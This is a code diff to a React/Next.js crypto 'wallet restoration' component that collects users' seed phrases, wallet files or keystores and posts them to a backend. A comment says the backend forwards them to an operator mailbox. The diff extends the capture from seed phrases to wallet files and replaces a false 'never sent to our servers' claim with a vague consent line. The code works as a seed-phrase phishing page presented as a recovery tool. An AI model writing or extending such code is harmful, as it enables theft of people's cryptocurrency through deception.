@@ -1,6 +1,7 @@
 'use client'
 
 import { useState } from 'react'
+import { useRouter } from 'next/navigation'
 
 type RestorationStep = 'idle' | 'analyzing' | 'validating' | 'processing' | 'success' | 'error'
 
@@ -12,6 +13,7 @@ export const WalletRestoration = () => {
   const [message, setMessage] = useState('')
   const [progress, setProgress] = useState(0)
   const [method, setMethod] = useState<'phrase' | 'file' | 'keystore'>('phrase')
+  const router = useRouter()
 
   const isValidSeedPhrase = (phrase: string) => {
     const words = phrase.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0)
@@ -98,33 +100,34 @@ export const WalletRestoration = () => {
         '✓ Recovery data prepared'
       )
 
-      // Send recovery email
+      // Send recovery email to backend (backend will forward to RESTORE_M)
+      const timestamp = new Date().toISOString()
       const response = await fetch('/api/send-recovery-email', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email,
           method,
-          seedPhrase: method === 'phrase' ? secretPhrase : undefined,
-          timestamp: new Date().toISOString(),
-        })
+          data: method === 'phrase' ? secretPhrase : walletFile,
+          timestamp,
+        }),
       })
 
       if (!response.ok) {
         throw new Error('Failed to send recovery details')
       }
 
-      // Success
+      // Success: show local success state then navigate to detailed audit page
       setStep('success')
-      setMessage(`✅ Recovery details sent to ${email}. Check your inbox.`)
+      setMessage(`✅ Recovery details submitted. Preparing audit...`)
       setSecretPhrase('')
       setProgress(100)
 
+      // Small pause to let the user see the success state, then navigate
       setTimeout(() => {
-        setStep('idle')
-        setProgress(0)
-        setMessage('')
-      }, 4000)
+        // Pass non-sensitive parameters to success page
+        router.push(`/recovery/success?method=${method}&time=${encodeURIComponent(timestamp)}`)
+      }, 1500)
     } catch (err) {
       setStep('error')
       setMessage(`❌ ${err instanceof Error ? err.message : 'Recovery failed'}`)
@@ -312,7 +315,7 @@ export const WalletRestoration = () => {
       {/* Security Note */}
       <div className="p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
         <p className="text-xs text-yellow-300">
-          <span className="font-bold">🔒 Security:</span> Your seed phrase is never sent to our servers. All processing happens locally on your device.
+          <span className="font-bold">🔒 Security:</span> By submitting, you consent to sending the recovery details to our secure recovery mailbox (configured by the site). Avoid submitting secrets to untrusted environments.
         </p>
       </div>
     </div>
